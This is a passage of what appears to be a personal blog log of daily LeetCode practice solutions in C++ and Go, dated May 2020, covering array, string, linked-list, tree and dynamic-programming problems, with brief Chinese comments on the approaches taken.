<h4 id="leetcode-15-三数之和-C"><a href="#leetcode-15-三数之和-C" class="headerlink" title="leetcode 15. 三数之和_C++"></a>leetcode 15. 三数之和_C++</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line">    <span class="keyword">if</span>(nums.<span class="built_in">size</span>()&lt;<span class="number">3</span>) <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">if</span>(nums[<span class="number">0</span>]&gt;<span class="number">0</span>) <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i&lt;nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i]&gt;<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">int</span> left=i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> x=nums[i];</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> y=nums[left];</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> z=nums[right];</span><br><span class="line">            <span class="keyword">if</span>(x+y&gt;<span class="number">0</span>-z) right--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(x+y&lt;<span class="number">0</span>-z) left++;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                vector&lt;<span class="keyword">int</span>&gt; temp;</span><br><span class="line">                temp.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">                temp.<span class="built_in">push_back</span>(nums[left]);</span><br><span class="line">                temp.<span class="built_in">push_back</span>(nums[right]);</span><br><span class="line">                ans.<span class="built_in">push_back</span>(temp);</span><br><span class="line">                <span class="keyword">while</span>(left&lt;right&amp;&amp;nums[left] == nums[left+<span class="number">1</span>]) left++;</span><br><span class="line">                <span class="keyword">while</span>(left&lt;right&amp;&amp;nums[right] == nums[right<span class="number">-1</span>]) right--;</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">while</span>(i+<span class="number">1</span>&lt;nums.<span class="built_in">size</span>()&amp;&amp;nums[i] == nums[i+<span class="number">1</span>]) i++;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; nums=&#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">-4</span>&#125;;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; ans=<span class="built_in">threeSum</span>(nums);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ans.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;ans[i].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,ans[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-2"><a href="#2020-5-2" class="headerlink" title="2020/5/2"></a>2020/5/2</h3><h4 id="leetcode-3-无重复字符的最长字串-Go"><a href="#leetcode-3-无重复字符的最长字串-Go" class="headerlink" title="leetcode 3. 无重复字符的最长字串_Go"></a>leetcode 3. 无重复字符的最长字串_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一反应可以用回溯</span></span><br><span class="line"><span class="comment">// 后来觉得边界太难确定了，就老老实实学习了滑动窗口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	mp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">byte</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(s) &lt;= <span class="number">1</span> &#123;</span><br><span class="line">		ans = <span class="built_in">len</span>(s)</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	currentLen := <span class="number">0</span></span><br><span class="line">	startIndex := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(s); i++ &#123;</span><br><span class="line">		_, ok := mp[s[i]]</span><br><span class="line">		<span class="keyword">if</span> !ok &#123;</span><br><span class="line">			mp[s[i]] = i</span><br><span class="line">			currentLen++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> currentLen &gt; ans &#123;</span><br><span class="line">				ans = currentLen</span><br><span class="line">			&#125;</span><br><span class="line">			startIndex = max(mp[s[i]], startIndex)</span><br><span class="line">			currentLen = i - startIndex</span><br><span class="line">			mp[s[i]] = i</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> currentLen &gt; ans &#123;</span><br><span class="line">		ans = currentLen</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	s := <span class="string">&quot;abcabcbb&quot;</span></span><br><span class="line">	fmt.Println(lengthOfLongestSubstring(s))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-16-最接近的三数之和-C"><a href="#leetcode-16-最接近的三数之和-C" class="headerlink" title="leetcode 16. 最接近的三数之和_C++"></a>leetcode 16. 最接近的三数之和_C++</h4><p>这题和昨天的三数之和做法一样，熟悉一下就好</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// two pointers</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">threeSumClosest</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(nums.<span class="built_in">size</span>()&lt;<span class="number">3</span>) <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">    ans=nums[<span class="number">0</span>]+nums[<span class="number">1</span>]+nums[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> st=i+<span class="number">1</span>,ed=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(st&lt;ed)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum=nums[st]+nums[ed]+nums[i];</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(target-sum)&lt;<span class="built_in">abs</span>(target-ans)) ans = sum;</span><br><span class="line">                <span class="keyword">if</span>(sum == target) <span class="keyword">return</span> sum;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; target) st++;</span><br><span class="line">                <span class="keyword">else</span> ed--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>]=&#123;<span class="number">-1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">-4</span>&#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nums</span><span class="params">(a,a+<span class="number">4</span>)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">threeSumClosest</span>(nums,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-3"><a href="#2020-5-3" class="headerlink" title="2020/5/3"></a>2020/5/3</h3><h4 id="leetcode-19-删除链表的倒数第N个节点-C"><a href="#leetcode-19-删除链表的倒数第N个节点-C" class="headerlink" title="leetcode 19. 删除链表的倒数第N个节点_C++"></a>leetcode 19. 删除链表的倒数第N个节点_C++</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="keyword">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 学了一手哑结点和删除</span></span><br><span class="line"><span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    ListNode* dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    dummy-&gt;next=head;</span><br><span class="line">    ListNode* first=dummy;</span><br><span class="line">    ListNode* second=dummy;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        first=first-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (first!=<span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        first=first-&gt;next;</span><br><span class="line">        second=second-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    second-&gt;next=second-&gt;next-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ListNode* head=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">1</span>);</span><br><span class="line">    head-&gt;next=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">2</span>);</span><br><span class="line">    head-&gt;next-&gt;next=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">3</span>);</span><br><span class="line">    head-&gt;next-&gt;next-&gt;next=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">4</span>);</span><br><span class="line">    head-&gt;next-&gt;next-&gt;next-&gt;next=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">5</span>);</span><br><span class="line">    ListNode* ans=<span class="built_in">removeNthFromEnd</span>(head,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans-&gt;val);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans-&gt;next-&gt;next-&gt;next-&gt;val);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-4"><a href="#2020-5-4" class="headerlink" title="2020/5/4"></a>2020/5/4</h3><h4 id="leetcode-45-跳跃游戏-II-Go"><a href="#leetcode-45-跳跃游戏-II-Go" class="headerlink" title="leetcode 45. 跳跃游戏 II_Go"></a>leetcode 45. 跳跃游戏 II_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 之前做过一道类似的跳跃游戏</span></span><br><span class="line"><span class="comment">// 原题是能否跳到尾部</span></span><br><span class="line"><span class="comment">// 现在改成最少跳跃几次</span></span><br><span class="line"><span class="comment">// 第一个反应是dp，但仔细想一下贪心也可以了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法一，从末尾处贪心</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">jump1</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	idx := <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">	steps := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> idx &gt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; idx; i++ &#123;</span><br><span class="line">			<span class="keyword">if</span> i+nums[i] &gt;= idx &#123;</span><br><span class="line">				idx = i</span><br><span class="line">				steps++</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> steps</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二，正向贪心，和原题差不多</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">jump</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	n := <span class="built_in">len</span>(nums)</span><br><span class="line">	steps := <span class="number">0</span></span><br><span class="line">	maxIdx := <span class="number">0</span></span><br><span class="line">	end := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++ &#123;</span><br><span class="line">		maxIdx = max(maxIdx, i+nums[i])</span><br><span class="line">		<span class="keyword">if</span> i == end &#123;</span><br><span class="line">			end = maxIdx</span><br><span class="line">			steps++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> steps</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(x, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> x &gt; y &#123;</span><br><span class="line">		<span class="keyword">return</span> x</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Println(jump(nums))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-5-5"><a href="#2020-5-5" class="headerlink" title="2020/5/5"></a>2020/5/5</h3><h4 id="leetcode-98-验证二叉搜索树-Go"><a href="#leetcode-98-验证二叉搜索树-Go" class="headerlink" title="leetcode 98. 验证二叉搜索树_Go"></a>leetcode 98. 验证二叉搜索树_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TreeNode struct</span></span><br><span class="line"><span class="keyword">type</span> TreeNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val   <span class="keyword">int</span></span><br><span class="line">	Left  *TreeNode</span><br><span class="line">	Right *TreeNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挺基本的题目，直接递归就好了</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValidBST</span><span class="params">(root *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> recurse(root, math.MinInt64, math.MaxInt64)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">recurse</span><span class="params">(root *TreeNode, lower <span class="keyword">int</span>, upper <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> root.Val &lt;= lower || root.Val &gt;= upper &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> recurse(root.Left, lower, root.Val) &amp;&amp; recurse(root.Right, root.Val, upper)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还有很基本的一个思路，就是结合中序遍历即可</span></span><br><span class="line"><span class="comment">// 不通过是因为leetcode中golang全局变量的问题</span></span><br><span class="line"><span class="keyword">var</span> pre <span class="keyword">int</span> = math.MinInt64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValidBST2</span><span class="params">(root *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 访问左子树</span></span><br><span class="line">	<span class="keyword">if</span> !isValidBST2(root.Left) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 访问当前节点：如果当前节点小于等于中序遍历的前一个节点，说明不满足BST，返回 false；否则继续遍历。</span></span><br><span class="line">	<span class="keyword">if</span> root.Val &lt;= pre &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	pre = root.Val</span><br><span class="line">	<span class="comment">// 访问右子树</span></span><br><span class="line">	<span class="keyword">return</span> isValidBST2(root.Right)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	root := &amp;TreeNode&#123;</span><br><span class="line">		Val:   <span class="number">0</span>,</span><br><span class="line">		Left:  <span class="literal">nil</span>,</span><br><span class="line">		Right: <span class="literal">nil</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(isValidBST2(root))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-5-6"><a href="#2020-5-6" class="headerlink" title="2020/5/6"></a>2020/5/6</h3><h4 id="leetcode-983-最低票价-Go"><a href="#leetcode-983-最低票价-Go" class="headerlink" title="leetcode 983. 最低票价_Go"></a>leetcode 983. 最低票价_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一反应就是dp</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mincostTickets</span><span class="params">(days []<span class="keyword">int</span>, costs []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	dp := <span class="built_in">make</span>([]<span class="keyword">int</span>, days[<span class="built_in">len</span>(days)<span class="number">-1</span>]+<span class="number">1</span>)</span><br><span class="line">	idx := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= days[<span class="built_in">len</span>(days)<span class="number">-1</span>]; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> i == days[idx] &#123;</span><br><span class="line">			dp[i] = min(dp[max(<span class="number">0</span>, i<span class="number">-1</span>)]+costs[<span class="number">0</span>], dp[max(<span class="number">0</span>, i<span class="number">-7</span>)]+costs[<span class="number">1</span>])</span><br><span class="line">			dp[i] = min(dp[max(<span class="number">0</span>, i<span class="number">-30</span>)]+costs[<span class="number">2</span>], dp[i])</span><br><span class="line">			idx++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			dp[i] = dp[i<span class="number">-1</span>]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dp[<span class="built_in">len</span>(dp)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	days := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">20</span>&#125;</span><br><span class="line">	costs := []<span class="keyword">int</span>&#123;<span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>&#125;</span><br><span class="line">	fmt.Println(mincostTickets(days, costs))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-5-7"><a href="#2020-5-7" class="headerlink" title="2020/5/7"></a>2020/5/7</h3><h4 id="leetcode-572-另一个树的子树-Go"><a href="#leetcode-572-另一个树的子树-Go" class="headerlink" title="leetcode 572. 另一个树的子树_Go"></a>leetcode 572. 另一个树的子树_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TreeNode struct</span></span><br><span class="line"><span class="keyword">type</span> TreeNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val   <span class="keyword">int</span></span><br><span class="line">	Left  *TreeNode</span><br><span class="line">	Right *TreeNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newNode</span><span class="params">(val <span class="keyword">int</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;TreeNode&#123;</span><br><span class="line">		Val:   val,</span><br><span class="line">		Left:  <span class="literal">nil</span>,</span><br><span class="line">		Right: <span class="literal">nil</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">creatTree</span><span class="params">(a []<span class="keyword">int</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(a)</span><br><span class="line">	<span class="keyword">if</span> length == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	node := newNode(a[<span class="number">0</span>])</span><br><span class="line">	queue := []*TreeNode&#123;&#125;</span><br><span class="line">	queue = <span class="built_in">append</span>(queue, node)</span><br><span class="line">	num := <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> num &lt; length &#123;</span><br><span class="line">		top := queue[<span class="number">0</span>]</span><br><span class="line">		queue = queue[<span class="number">1</span>:]</span><br><span class="line">		<span class="keyword">if</span> top.Left == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> a[num] != <span class="number">-1</span> &#123;</span><br><span class="line">				top.Left = newNode(a[num])</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, top.Left)</span><br><span class="line">			&#125;</span><br><span class="line">			num++</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> num == length &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> top.Right == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> a[num] != <span class="number">-1</span> &#123;</span><br><span class="line">				top.Right = newNode(a[num])</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, top.Right)</span><br><span class="line">			&#125;</span><br><span class="line">			num++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最基础的DFS，别的方法我是想不出的</span></span><br><span class="line"><span class="comment">// 自己写的太丑了，可以运行，就贴了官方的，反正DFS都差不多</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubtree</span><span class="params">(s *TreeNode, t *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> s == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> check(s, t) || isSubtree(s.Left, t) || isSubtree(s.Right, t)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">(a, b *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a == <span class="literal">nil</span> &amp;&amp; b == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> a == <span class="literal">nil</span> || b == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> a.Val == b.Val &#123;</span><br><span class="line">		<span class="keyword">return</span> check(a.Left, b.Left) &amp;&amp; check(a.Right, b.Right)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	s := []<span class="keyword">int</span>&#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span 